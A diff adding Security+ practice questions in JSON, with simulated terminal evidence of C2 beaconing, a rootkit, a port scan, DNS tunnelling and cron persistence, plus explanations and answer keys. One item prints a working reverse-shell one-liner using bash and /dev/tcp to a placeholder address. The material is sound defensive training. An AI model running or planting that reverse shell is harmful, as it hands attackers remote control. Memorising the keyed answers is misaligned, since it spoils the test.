+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What happened",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "SQL injection: crafted input in the parameter altered the statement lookup query"
+                },
+                {
+                  "id": "b",
+                  "text": "Cross-site scripting: script tags were stored in the file parameter"
+                },
+                {
+                  "id": "c",
+                  "text": "Directory traversal: ../ sequences reached files outside the folder"
+                },
+                {
+                  "id": "d",
+                  "text": "Enumeration: guessing other customers' statement file names"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "Fix",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Allow-list the files the page may serve, and rotate the secrets in .env"
+                },
+                {
+                  "id": "b",
+                  "text": "Add a filter that rejects any request containing the string ../ in the file parameter"
+                },
+                {
+                  "id": "c",
+                  "text": "Switch the statement lookup to parameterised queries"
+                },
+                {
+                  "id": "d",
+                  "text": "HTML-encode the file name before showing it on the page"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "c",
+            "fix": "a"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-04",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "4.4",
+    "topic": "Alert validation — endpoint connections",
+    "title": "Validate an outbound-connection alert",
+    "estMinutes": 6,
+    "scenario": "At 07:45 the SIEM raised an alert: finance workstation FIN-WS07 (10.30.8.27) has sent traffic to the same outside address every 60 seconds since 01:12, including overnight when nobody was signed in. Before anyone acts, the alert needs validating. You have a remote shell on FIN-WS07. Run the commands that confirm or rule out the alert, then decide what it is and what to do first.",
+    "cliFault": {
+      "fault": "c2"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "FIN-WS07",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "ip",
+            "necessary": false,
+            "promptLine": "ip -brief address show eth0",
+            "reveal": "ip",
+            "lines": [
+              {
+                "text": "eth0             UP             10.30.8.27/24"
+              }
+            ]
+          },
+          {
+            "id": "netstat",
+            "necessary": true,
+            "promptLine": "sudo netstat -antp | grep ESTABLISHED",
+            "reveal": "netstat",
+            "lines": [
+              {
+                "text": "tcp        0      0 10.30.8.27:22           10.30.1.5:51544         ESTABLISHED 1022/sshd: analyst"
+              },
+              {
+                "text": "tcp        0      0 10.30.8.27:41876        10.30.1.20:443          ESTABLISHED 2311/fin-client"
+              },
+              {
+                "text": "tcp        0      0 10.30.8.27:53312        203.0.113.66:4444       ESTABLISHED 4120/kworkerd"
+              }
+            ]
+          },
+          {
+            "id": "uptime",
+            "necessary": false,
+            "promptLine": "uptime",
+            "reveal": "uptime",
+            "lines": [
+              {
+                "text": " 07:52:40 up 9 days,  2:31,  1 user,  load average: 0.11, 0.09, 0.04"
+              }
+            ]
+          },
+          {
+            "id": "exe",
+            "necessary": true,
+            "promptLine": "sudo ls -l /proc/4120/exe",
+            "reveal": "exe",
+            "lines": [
+              {
+                "text": "lrwxrwxrwx 1 jmarsh jmarsh 0 Oct  8 01:12 /proc/4120/exe -> /tmp/.cache/kworkerd (deleted)"
+              }
+            ]
+          },
+          {
+            "id": "df",
+            "necessary": false,
+            "promptLine": "df -h /tmp",
+            "reveal": "df",
+            "lines": [
+              {
+                "text": "Filesystem      Size  Used Avail Use% Mounted on"
+              },
+              {
+                "text": "/dev/sda2        40G   11G   27G  29% /"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that confirm or rule out the alert on the host itself.",
+        "explanation": "`netstat` ties the traffic to a process: PID 4120, called kworkerd, holds a live connection to 203.0.113.66 on port 4444. `ls -l /proc/4120/exe` shows where that program came from: a hidden folder in /tmp, owned by an ordinary user, and already deleted from disk while it keeps running. Real kworker threads belong to the kernel and have no program file at all. The interface address, uptime and disk space tell you nothing about the connection.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "netstat",
+            "exe"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What is the alert showing, and what should you do first?",
+        "explanation": "A check-in every 60 seconds, overnight, from a program posing as a kernel thread and running from a deleted file in /tmp is command-and-control beaconing. An update check would come from a real installed program, one connection checking in once a minute is not a denial-of-service attack, and nothing here points to file sharing. Quarantining the workstation cuts the attacker off and keeps the evidence. Powering off is the trap: the program has been deleted from disk, so the running process in memory is the only copy left, and shutting down destroys it. Killing the process loses that copy too and does nothing about whatever started it. Tuning the rule would hide a real compromise.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What it is",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "A false positive: a routine software update check running on a timer"
+                },
+                {
+                  "id": "b",
+                  "text": "An outbound denial-of-service attack from the workstation"
+                },
+                {
+                  "id": "c",
+                  "text": "A user running an unapproved file-sharing app"
+                },
+                {
+                  "id": "d",
+                  "text": "Command-and-control beaconing from a disguised process in /tmp"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "First response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Quarantine the workstation, leaving it powered on"
+                },
+                {
+                  "id": "b",
+                  "text": "Power the workstation off straight away to stop the traffic"
+                },
+                {
+                  "id": "c",
+                  "text": "Kill process 4120, delete /tmp/.cache and close the alert"
+                },
+                {
+                  "id": "d",
+                  "text": "Tune the SIEM rule to ignore port 4444"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "d",
+            "fix": "a"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-05",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "4.4",
+    "topic": "Alert validation — file integrity",
+    "title": "Integrity alert on a web server",
+    "estMinutes": 7,
+    "scenario": "Overnight, the file integrity monitoring agent on WEB-02 raised a high-priority alert that monitored system files had changed. The server runs the public website and is patched through its normal package manager. You have a shell on WEB-02. Validate the alert, then decide what happened and how to respond.",
+    "cliFault": {
+      "fault": "integrity"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "WEB-02",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "uptime",
+            "necessary": false,
+            "promptLine": "uptime",
+            "reveal": "uptime",
+            "lines": [
+              {
+                "text": " 08:05:19 up 41 days,  3:12,  1 user,  load average: 0.31, 0.27, 0.22"
+              }
+            ]
+          },
+          {
+            "id": "fim",
+            "necessary": true,
+            "promptLine": "fim-agent report --since 24h",
+            "reveal": "fim",
+            "lines": [
+              {
+                "text": "TIME (UTC)           CHANGE    PATH              SHA-256 (old -> new)      SIZE (old -> new)"
+              },
+              {
+                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/ps       22a8...7f10 -> c91e...5b3d  133432 -> 149016"
+              },
+              {
+                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/ls       9f1c...e2a4 -> 4b7d...01c9  142312 -> 155880"
+              },
+              {
+                "text": "2026-10-09 03:17:44  MODIFIED  /usr/bin/netstat  6d0e...aa31 -> 0e57...d6f2  155008 -> 171224"
+              }
+            ]
+          },
+          {
+            "id": "who",
+            "necessary": false,
+            "promptLine": "who",
+            "reveal": "who",
+            "lines": [
+              {
+                "text": "analyst  pts/0        2026-10-09 08:03 (10.20.0.15)"
+              }
+            ]
+          },
+          {
+            "id": "pkg",
+            "necessary": true,
+            "promptLine": "tail -n 3 /var/log/pkg-history.log",
+            "reveal": "pkg",
+            "lines": [
+              {
+                "text": "2026-09-17 10:02:11 upgrade libssl3 3.0.13-1 -> 3.0.15-1"
+              },
+              {
+                "text": "2026-09-17 10:02:14 upgrade tzdata 2026a-1 -> 2026b-1"
+              },
+              {
+                "text": "2026-09-17 10:02:20 upgrade ca-certificates 20240203 -> 20250419"
+              }
+            ]
+          },
+          {
+            "id": "df",
+            "necessary": false,
+            "promptLine": "df -h /",
+            "reveal": "df",
+            "lines": [
+              {
+                "text": "Filesystem      Size  Used Avail Use% Mounted on"
+              },
+              {
+                "text": "/dev/sda1        60G   19G   38G  34% /"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what changed and whether routine patching could explain it.",
+        "explanation": "The integrity report shows what changed: ps, ls and netstat were all replaced within the same second at 03:17, each with a new hash and a bigger file. The package history shows the last update on this server was on 17 September and touched none of those tools, so patching does not explain the change. Uptime, the signed-in users and disk space say nothing about the files.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "fim",
+            "pkg"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What happened, and how should you respond?",
+        "explanation": "ps, ls and netstat are the tools an administrator uses to look at running processes, files and network connections. Replacing all three at once, outside any update, is how a rootkit hides an attacker: the new versions simply leave the attacker's activity out of their output. Corruption would not neatly grow three related files in the same second, and an agent update would not change the files' hashes. Whoever wrote to /usr/bin had root, so nothing on the server can be trusted. Isolate it, keep an image for the investigation, and rebuild from a known-good image. Reinstalling three packages only fixes the three files you know about. Running the server's own ps or netstat is the trap, because those are the tools that now lie.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What happened",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Routine patching: an overnight update replaced the three tools"
+                },
+                {
+                  "id": "b",
+                  "text": "Rootkit: ps, ls and netstat were swapped for trojanised copies"
+                },
+                {
+                  "id": "c",
+                  "text": "Disk corruption: bad sectors altered the three files"
+                },
+                {
+                  "id": "d",
+                  "text": "False positive: the agent re-baselined after its own update"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "Response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Accept the new hashes as the baseline and close the alert"
+                },
+                {
+                  "id": "b",
+                  "text": "Reinstall the three packages from the repository and return the server to service"
+                },
+                {
+                  "id": "c",
+                  "text": "Run ps and netstat on WEB-02 to look for the attacker"
+                },
+                {
+                  "id": "d",
+                  "text": "Isolate WEB-02, image it, then rebuild from a known-good image"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "b",
+            "fix": "d"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-06",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "4.9",
+    "topic": "Log investigation — firewall",
+    "title": "Burst of denied traffic at the perimeter",
+    "estMinutes": 6,
+    "scenario": "At 09:14 the perimeter firewall logged a sudden burst of denied connections from 198.51.100.73 to the DMZ web server, public address 192.0.2.10. The web server should only be reachable on HTTPS. You have a shell on LOG-01, which collects the firewall log. Work out what the burst was and whether any of it got through, then decide what it was and what to do.",
+    "cliFault": {
+      "fault": "portscan"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "LOG-01",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "whois",
+            "necessary": false,
+            "promptLine": "whois 198.51.100.73 | grep -i country",
+            "reveal": "whois",
+            "lines": [
+              {
+                "text": "country:        NL"
+              }
+            ]
+          },
+          {
+            "id": "deny",
+            "necessary": true,
+            "promptLine": "grep 198.51.100.73 /var/log/fw/perimeter.log | head -n 8",
+            "reveal": "deny",
+            "lines": [
+              {
+                "text": "2026-10-07T09:14:02.118Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:3306 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.119Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:22 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.121Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:8080 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.122Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:445 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.124Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:21 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.125Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:5900 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.127Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:110 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:02.128Z DENY  TCP 198.51.100.73:61022 -> 192.0.2.10:25 flags=S"
+              }
+            ]
+          },
+          {
+            "id": "count",
+            "necessary": false,
+            "promptLine": "grep -c 198.51.100.73 /var/log/fw/perimeter.log",
+            "reveal": "count",
+            "lines": [
+              {
+                "text": "1000"
+              }
+            ]
+          },
+          {
+            "id": "allow",
+            "necessary": true,
+            "promptLine": "grep 198.51.100.73 /var/log/fw/perimeter.log | grep ALLOW",
+            "reveal": "allow",
+            "lines": [
+              {
+                "text": "2026-10-07T09:14:02.412Z ALLOW TCP 198.51.100.73:61022 -> 192.0.2.10:443 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:14:03.067Z ALLOW TCP 198.51.100.73:61022 -> 192.0.2.10:3389 flags=S"
+              }
+            ]
+          },
+          {
+            "id": "recent",
+            "necessary": false,
+            "promptLine": "tail -n 3 /var/log/fw/perimeter.log",
+            "reveal": "recent",
+            "lines": [
+              {
+                "text": "2026-10-07T09:31:40.552Z ALLOW TCP 203.0.113.201:52211 -> 192.0.2.10:443 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:31:41.008Z ALLOW TCP 198.51.100.140:61877 -> 192.0.2.10:443 flags=S"
+              },
+              {
+                "text": "2026-10-07T09:31:41.390Z ALLOW TCP 203.0.113.18:49302 -> 192.0.2.10:443 flags=S"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what the burst was and what got through.",
+        "explanation": "The first eight log lines show the pattern: one source, a different destination port on every line (3306, 22, 8080, 445 and so on), a single SYN each, about a millisecond apart. Filtering the same source for ALLOW shows what the firewall let through: 443, which is expected, and 3389 (remote desktop), which should not be reachable from the internet at all. The country lookup, the total count and the latest log lines add colour but do not change the answer.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "deny",
+            "allow"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What was the burst, and what should you do?",
+        "explanation": "One probe per port across many ports in a couple of seconds is reconnaissance: a port scan looking for services to attack. A SYN flood hammers one port with huge volume, and 443 got exactly one SYN. Nothing shows a remote desktop session was set up, only that the firewall let the first packet through, so calling it a breach goes too far. It is not a ping sweep either, because it hit one host over TCP. The trap is \"every probe was denied\". Not every probe was: the firewall let 3389 through from the internet when only HTTPS should be reachable. Remove that rule, and block the scanning address while you check whether anything has since tried to sign in on 3389.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What it was",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "A port scan: one SYN to each of many ports, milliseconds apart"
+                },
+                {
+                  "id": "b",
+                  "text": "A SYN flood: a denial-of-service attack aimed at the HTTPS service"
+                },
+                {
+                  "id": "c",
+                  "text": "A successful remote desktop break-in to the web server"
+                },
+                {
+                  "id": "d",
+                  "text": "A ping sweep mapping live hosts across the DMZ"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "Response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Nothing: every probe was denied, so the firewall did its job"
+                },
+                {
+                  "id": "b",
+                  "text": "Enable SYN cookies on the web server to absorb the flood"
+                },
+                {
+                  "id": "c",
+                  "text": "Declare a breach and rebuild the web server"
+                },
+                {
+                  "id": "d",
+                  "text": "Block the source and remove the rule exposing 3389"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "a",
+            "fix": "d"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-07",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "4.9",
+    "topic": "Log investigation — DNS",
+    "title": "Unusual DNS volume from one workstation",
+    "estMinutes": 7,
+    "scenario": "Since about 10:00, the internal DNS resolver DNS-01 has been answering far more queries from 10.40.6.31, an HR workstation, than from any other machine. You have a shell on DNS-01. Look at what the client has been asking for, then decide what is happening and what to do first.",
+    "cliFault": {
+      "fault": "dnsTunnel"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "DNS-01",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "uptime",
+            "necessary": false,
+            "promptLine": "uptime",
+            "reveal": "uptime",
+            "lines": [
+              {
+                "text": " 10:41:07 up 22 days,  4:18,  1 user,  load average: 0.94, 0.88, 0.71"
+              }
+            ]
+          },
+          {
+            "id": "queries",
+            "necessary": true,
+            "promptLine": "grep \"client=10.40.6.31\" /var/log/dns/query.log | head -n 4",
+            "reveal": "queries",
+            "lines": [
+              {
+                "text": "2026-10-06T10:02:13.218Z client=10.40.6.31 qtype=TXT qname=706179726f6c6c5f71332e786c7378.0001.x7.cdn-sync.example rcode=NOERROR"
+              },
+              {
+                "text": "2026-10-06T10:02:13.611Z client=10.40.6.31 qtype=TXT qname=504b0304140006000800000021006b2f1c3e8e010000e7040000.0002.x7.cdn-sync.example rcode=NOERROR"
+              },
+              {
+                "text": "2026-10-06T10:02:14.007Z client=10.40.6.31 qtype=TXT qname=130000005b436f6e74656e745f54797065735d2e786d6cad94cb.0003.x7.cdn-sync.example rcode=NOERROR"
+              },
+              {
+                "text": "2026-10-06T10:02:14.402Z client=10.40.6.31 qtype=TXT qname=6ec2300c45f7487c87d5b6a5b0e04ac0cdc8a9a8bd16fdd8c3c4.0004.x7.cdn-sync.example rcode=NOERROR"
+              }
+            ]
+          },
+          {
+            "id": "lease",
+            "necessary": false,
+            "promptLine": "grep -A1 \"lease 10.40.6.31\" /var/lib/dhcp/leases",
+            "reveal": "lease",
+            "lines": [
+              {
+                "text": "lease 10.40.6.31 {"
+              },
+              {
+                "text": "  client-hostname \"HR-WS12\";"
+              }
+            ]
+          },
+          {
+            "id": "whois",
+            "necessary": true,
+            "promptLine": "whois cdn-sync.example | grep -iE \"creation date|registrar:\"",
+            "reveal": "whois",
+            "lines": [
+              {
+                "text": "Creation Date: 2026-10-04T21:14:09Z"
+              },
+              {
+                "text": "Registrar: Example Registrar, LLC"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what the workstation is sending and who it is talking to.",
+        "explanation": "The query log shows the pattern: TXT lookups several times a second, each for a different, very long name made of hex, with a counter (0001, 0002 and so on) in front of the same domain. The first label decodes from hex to payroll_q3.xlsx, and the next one starts with 504b0304, the header every .xlsx (zip) file begins with. The registration lookup shows cdn-sync.example was created on 4 October, two days before this traffic, so it is not an established content-delivery service. Uptime and the DHCP lease only tell you about the server and which machine holds the address.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "queries",
+            "whois"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What is happening, and what should you do first?",
+        "explanation": "A file is being cut into chunks, hex-encoded and sent out as the names being looked up, and the attacker's name server for cdn-sync.example collects the pieces. That is DNS tunnelling, used here to exfiltrate data. Cache poisoning plants forged answers in a resolver, but these are queries from one client. Amplification uses spoofed requests to make resolvers flood a victim, and nothing here is spoofed. A stuck app repeats the same name, while every name here is different and counts upwards. Sinkholing the domain stops the transfer for every machine at once, and isolating the workstation lets you find the malware sending it. Flushing the cache is the fix for poisoning and does nothing here.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What is happening",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "DNS cache poisoning: forged answers are being planted in the resolver"
+                },
+                {
+                  "id": "b",
+                  "text": "DNS tunnelling: a file is leaving hex-encoded inside query names"
+                },
+                {
+                  "id": "c",
+                  "text": "DNS amplification: the resolver is being used to flood a victim"
+                },
+                {
+                  "id": "d",
+                  "text": "A misconfigured app retrying the same lookup in a loop"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "First response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Flush the resolver cache and restart the DNS service"
+                },
+                {
+                  "id": "b",
+                  "text": "Rate-limit responses on the resolver to stop the outbound flood"
+                },
+                {
+                  "id": "c",
+                  "text": "Restart the app on the workstation to clear the loop"
+                },
+                {
+                  "id": "d",
+                  "text": "Sinkhole the domain on the resolver and isolate 10.40.6.31"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "b",
+            "fix": "d"
+          }
+        }
+      }
+    ]
+  },
+
+  {
+    "id": "sp-cli-08",
+    "cert": "secplus",
+    "archetype": "cli",
+    "objective": "4.9",
+    "topic": "Log investigation — endpoint",
+    "title": "Repeat outbound alert on an app server",
+    "estMinutes": 7,
+    "scenario": "Yesterday the SOC killed a suspicious process on Linux app server APP-03 that was talking to 198.51.100.19, and the server was rebooted at 06:40 this morning. This morning the SIEM shows APP-03 connecting to 198.51.100.19 again at 07:05, 08:05 and 09:05. You have a shell on APP-03, and it is now 09:40. Find out what keeps starting the connection, then decide what it is and what to do.",
+    "cliFault": {
+      "fault": "persistence"
+    },
+    "assets": {
+      "reference": {
+        "kind": "terminal",
+        "host": "APP-03",
+        "session": "ssh",
+        "reveal": "external",
+        "excerpts": [
+          {
+            "id": "ss",
+            "necessary": false,
+            "promptLine": "sudo ss -tnp dst 198.51.100.19",
+            "reveal": "ss",
+            "lines": [
+              {
+                "text": "State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process"
+              }
+            ]
+          },
+          {
+            "id": "timers",
+            "necessary": false,
+            "promptLine": "systemctl list-timers --no-pager | head -n 3",
+            "reveal": "timers",
+            "lines": [
+              {
+                "text": "NEXT                         LEFT          LAST                         PASSED      UNIT             ACTIVATES"
+              },
+              {
+                "text": "Sat 2026-10-10 00:00:00 UTC  14h left      Fri 2026-10-09 00:00:01 UTC  9h ago      logrotate.timer  logrotate.service"
+              },
+              {
+                "text": "Mon 2026-10-12 00:00:00 UTC  2 days left   Mon 2026-10-05 00:00:04 UTC  4 days ago  fstrim.timer     fstrim.service"
+              }
+            ]
+          },
+          {
+            "id": "crontab",
+            "necessary": true,
+            "promptLine": "sudo grep -rv \"^#\" /var/spool/cron/crontabs",
+            "reveal": "crontab",
+            "lines": [
+              {
+                "text": "/var/spool/cron/crontabs/www-data:5 * * * * /var/tmp/.sysupd >/dev/null 2>&1"
+              }
+            ]
+          },
+          {
+            "id": "crond",
+            "necessary": false,
+            "promptLine": "ls /etc/cron.d",
+            "reveal": "crond",
+            "lines": [
+              {
+                "text": "sysstat"
+              }
+            ]
+          },
+          {
+            "id": "script",
+            "necessary": true,
+            "promptLine": "cat /var/tmp/.sysupd",
+            "reveal": "script",
+            "lines": [
+              {
+                "text": "#!/bin/bash"
+              },
+              {
+                "text": "bash -i >& /dev/tcp/198.51.100.19/443 0>&1"
+              }
+            ]
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "cmds",
+        "type": "analyze",
+        "points": 1,
+        "prompt": "Select the commands that show what is starting the connection and what it runs.",
+        "explanation": "The web service account www-data has a crontab entry that runs /var/tmp/.sysupd at five minutes past every hour, which matches 07:05, 08:05 and 09:05 exactly. The script opens an interactive shell and hands it to 198.51.100.19 over port 443. The socket list shows no open connection to 198.51.100.19 right now, so nothing is running between check-ins. The system timers and /etc/cron.d hold only routine jobs.",
+        "payload": {
+          "multi": true,
+          "mode": "reveal",
+          "scoring": "lenient"
+        },
+        "answer": {
+          "selected": [
+            "crontab",
+            "script"
+          ]
+        }
+      },
+      {
+        "id": "dx",
+        "type": "configure",
+        "points": 1,
+        "prompt": "What is going on, and what should you do?",
+        "explanation": "The attacker left a scheduled job behind so their access comes back on its own. That is persistence, and it is why killing the process and rebooting did not help: the crontab survives a reboot and starts the shell again at the next :05. The reboot ended yesterday's process and the socket list shows no live connection now, so each hourly connection is a fresh launch. A worm would reach out to other internal machines, not call one outside address on a timer, and a hidden file in /var/tmp that hands a shell to an outside address is not an update job. Keep a copy of the script, remove the cron entry and block the address. Changing the www-data password is the trap: cron runs the job without any password. Then find out how the attacker got code running as www-data, most likely through the web application.",
+        "payload": {
+          "slots": [
+            {
+              "id": "rootCause",
+              "label": "What it is",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Yesterday's process was never killed and has been running ever since"
+                },
+                {
+                  "id": "b",
+                  "text": "A worm on APP-03 spreading to other servers every hour"
+                },
+                {
+                  "id": "c",
+                  "text": "Persistence: a cron job relaunches a reverse shell every hour"
+                },
+                {
+                  "id": "d",
+                  "text": "A legitimate hourly update job contacting its vendor"
+                }
+              ]
+            },
+            {
+              "id": "fix",
+              "label": "Response",
+              "options": [
+                {
+                  "id": "a",
+                  "text": "Kill the process each time the SIEM shows it reconnecting"
+                },
+                {
+                  "id": "b",
+                  "text": "Reboot the server again and confirm the process is gone"
+                },
+                {
+                  "id": "c",
+                  "text": "Save the script, remove the cron entry, block 198.51.100.19"
+                },
+                {
+                  "id": "d",
+                  "text": "Change the password on the www-data account so the attacker is locked out"
+                }
+              ]
+            }
+          ]
+        },
+        "answer": {
+          "slots": {
+            "rootCause": "c",
+            "fix": "c"
+          }
+        }
+      }
+    ]
+  },
+
+  // ===== v8.156.0 — secure network design PBQs (diagram), SY0-701 3.1 3.2 3.4; two-reviewer gate passed 2026-10-11 =====
+  {
+    "id": "sp-dg-01",
+    "cert": "secplus",
+    "objective": "3.2",
+    "topic": "Security zones",
+    "title": "Bring the web shop in-house",
+    "estMinutes": 5,
+    "archetype": "diagram",
+    "scenario": "Brightwater Outfitters is moving its online shop off a hosting provider and onto its own hardware. FW-1 is a stateful layer 4 firewall with three interfaces: one to the ISP, one to SW-1 (172.16.10.0/24) and one to SW-2 (10.20.0.0/24). Customers on the internet browse and buy through the shop and email the support team. The shop reads and writes orders in a database. The file shares and the directory server are for staff only. Place each server, decide where the web application firewall goes, and choose the flows FW-1 should permit.",
+    "assets": {
+      "reference": {
+        "kind": "network",
+        "devices": [
+          {
+            "id": "inet",
+            "label": "INTERNET",
+            "type": "box",
+            "x": 1,
+            "y": 0
+          },
+          {
+            "id": "fw1",
+            "label": "FW-1",
+            "type": "firewall",
+            "x": 1,
+            "y": 1
+          },
+          {
+            "id": "sw1",
+            "label": "SW-1",
+            "type": "switch",
+            "zone": "screened subnet",
+            "ip": "172.16.10.2",
+            "mask": "255.255.255.0",
+            "x": 0,
+            "y": 2
+          },
+          {
+            "id": "sw2",
+            "label": "SW-2",
+            "type": "switch",
+            "zone": "internal LAN",
+            "ip": "10.20.0.2",
+            "mask": "255.255.255.0",
+            "x": 3,
+            "y": 2
+          }
+        ],
+        "links": [
+          {
+            "from": "inet",
+            "to": "fw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw1"
+          },
+          {
+            "from": "fw1",
+            "to": "sw2"
+          }
+        ]
+      }
+    },
+    "steps": [
+      {
+        "id": "s1",
+        "type": "categorize",
+        "points": 1,
+        "prompt": "Drag each server into the zone where it belongs.",
+        "explanation": "Anything the internet has to start a connection to goes in the screened subnet: here that is the shop front end and the inbound mail gateway. FW-1 still filters what reaches them, and if one is compromised the attacker lands in a zone that cannot freely reach the LAN. The order database, the directory server and the file shares only ever serve internal systems, so they stay on the internal LAN. Putting DB-1 next to WEB-1 is the usual trap, because one web exploit would then put the attacker on the same segment as every customer order. Nothing belongs outside FW-1. A server on the internet side gets no filtering at all.",
+        "payload": {
+          "items": [
+            {
+              "id": "db",
+              "label": "DB-1 · order database the shop reads and writes"
+            },
+            {
+              "id": "web",
+              "label": "WEB-1 · public shop front end"
+            },
+            {
+              "id": "dc",
+              "label": "DC-1 · directory and login server"
+            },
+            {
+              "id": "mx",
+              "label": "MX-1 · mail gateway that accepts email from the internet"
+            },
+            {
+              "id": "fs",
+              "label": "FS-1 · staff file shares"
+            }
+          ],
+          "buckets": [
+            {
+              "id": "out",
+              "label": "Outside FW-1 (internet side)"
+            },
+            {
+              "id": "dmz",
+              "label": "Screened subnet (SW-1)"
+            },
+            {
+              "id": "lan",
+              "label": "Internal LAN (SW-2)"
+            }
+          ]
+        },
+        "answer": {
+          "map": {
+            "db": "lan",
+            "web": "dmz",
+            "dc": "lan",
+            "mx": "dmz",
+            "fs": "lan"
+          }
+        }
+      },
+      {
+        "id": "s2",
+        "type": "configure",
+        "points": 1,
+        "prompt": "Place the web application firewall (WAF) and say what it adds.",
+        "explanation": "A WAF protects a web application, so it has to sit inline in front of WEB-1, where it can read and block each HTTP request before the application sees it. In front of DB-1 it would be looking at database queries, not web requests, and on a SPAN port it only sees copies, so it could never block anything. FW-1 already filters on addresses and ports. What the WAF adds is layer 7 inspection of the request content, which is where SQL injection and cross-site scripting live. Scanning email attachments is the mail gateway's job.",
+        "payload": {
+          "slots": [
+            {
+              "id": "place",
+              "label": "WAF placement",
+              "options": [
+                {
+                  "id": "span",
+                  "text": "On a SPAN port of SW-2, watching a copy of internal traffic"
+                },
+                {
+                  "id": "db",
+                  "text": "Inline in front of DB-1, inspecting every query the shop sends"
+                },
+                {
+                  "id": "web",
+                  "text": "Inline in front of WEB-1, inspecting every request to the shop"
+                },
+                {
+                  "id": "staff",
+                  "text": "Inline between SW-2 and the staff PCs, covering their browsing"
